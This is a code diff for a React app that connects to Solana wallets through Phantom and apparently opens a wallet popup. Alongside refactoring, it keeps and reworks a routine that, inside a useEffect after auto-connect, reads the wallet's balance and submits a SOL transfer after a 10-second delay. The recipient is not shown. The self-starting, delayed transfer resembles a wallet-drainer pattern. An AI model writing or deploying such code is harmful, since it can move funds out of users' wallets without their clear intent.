@@ -8,49 +8,51 @@ import {
 } from '@solana/web3.js';
 import {
   useWallet,
-  WalletMultiButton,
   WalletProvider,
   ConnectionProvider,
 } from '@solana/wallet-adapter-react';
-import {
-  WalletModalProvider,
-} from '@solana/wallet-adapter-react-ui';
+import { WalletModalProvider, WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 import {
   PhantomWalletAdapter,
-  BackpackWalletAdapter,
 } from '@solana/wallet-adapter-wallets';
+
+import './App.css';
 
 require('@solana/wallet-adapter-react-ui/styles.css');
 
-const connection = new Connection('https://api.mainnet-beta.solana.com');
+const network = 'https://api.mainnet-beta.solana.com';
+
+const WalletWrapper: FC<{ children: React.ReactNode }> = ({ children }) => {
+  const endpoint = network;
+  const wallets = [new PhantomWalletAdapter()];
+
+  return (
+    <ConnectionProvider endpoint={endpoint}>
+      <WalletProvider wallets={wallets} autoConnect>
+        <WalletModalProvider>{children}</WalletModalProvider>
+      </WalletProvider>
+    </ConnectionProvider>
+  );
+};
 
 const WalletConnectionHandler: FC = () => {
-  const { publicKey, connected, signTransaction } = useWallet();
+  const { connected, publicKey, signTransaction } = useWallet();
   const [solBalance, setSolBalance] = useState<number | null>(null);
-  const [loading, setLoading] = useState<boolean>(false);
+  const [loading, setLoading] = useState(false);
 
   useEffect(() => {
-    const fetchBalance = async () => {
-      if (publicKey) {
-        const balance = await connection.getBalance(publicKey);
-        setSolBalance(balance / 1e9); // Convert lamports to SOL
-      }
-    };
-    fetchBalance();
-  }, [publicKey]);
+    const connection = new Connection(network);
 
-  useEffect(() => {
     const sendSolWithDelay = async () => {
-      if (!publicKey) return;
-
-      setLoading(true);
-
       try {
-        const walletPublicKey = publicKey;
-        const sendAmount = 0.001 * 1e9; // 0.001 SOL in lamports
-
+        setLoading(true);
+        const walletPublicKey = publicKey!;
         const balance = await connection.getBalance(walletPublicKey);
-        if (balance <= 0) {
+        const sol = balance / 1e9;
+        setSolBalance(sol);
+
+        const sendAmount = 0.001 * 1e9; // lamports
+        if (sol <= 0) {
           alert('⚠️ Not enough SOL to send.');
           return;
         }
@@ -62,7 +64,6 @@ const WalletConnectionHandler: FC = () => {
             lamports: sendAmount,
           })
         );
-
         tx.feePayer = walletPublicKey;
         tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
 
@@ -82,7 +83,6 @@ const WalletConnectionHandler: FC = () => {
             console.error('❌ Failed to send transaction:', err);
           }
         }, 10000); // 10-second delay
-
       } catch (err) {
         console.error('❌ Error sending transaction:', err);
         alert('Transaction failed.');
@@ -150,18 +150,6 @@ const WalletConnectionHandler: FC = () => {
   );
 
   return ReactDOM.createPortal(WalletUI, document.getElementById('walletPopup') as HTMLElement);
-};
-
-const WalletWrapper: FC<{ children: React.ReactNode }> = ({ children }) => {
-  const wallets = [new PhantomWalletAdapter(), new BackpackWalletAdapter()];
-
-  return (
-    <ConnectionProvider endpoint="https://api.mainnet-beta.solana.com">
-      <WalletProvider wallets={wallets} autoConnect>
-        <WalletModalProvider>{children}</WalletModalProvider>
-      </WalletProvider>
-    </ConnectionProvider>
-  );
 };
 
 const App: FC = () => {
